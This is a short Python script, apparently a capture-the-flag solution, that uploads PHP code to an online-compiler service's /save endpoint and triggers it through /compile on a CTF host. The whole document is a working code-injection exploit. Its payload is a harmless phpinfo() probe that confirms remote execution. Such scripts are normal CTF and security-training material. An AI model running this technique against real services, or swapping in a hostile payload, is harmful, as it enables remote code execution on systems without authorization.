#!/usr/bin/env python3

import requests

HOST = "onlinecompiler.2021.3k.ctf.to:5000"

def write_payload():
    r = requests.post(f"http://{HOST}/save", data={
        "c_type": "php",
        "code": f"""<?php phpinfo();?>"""
    })

    fname = r.text
    print(fname)

    r = requests.post(f"http://{HOST}/compile", data={
        "c_type": "php",
        "filename": fname
    })

    print(r.text)

write_payload()
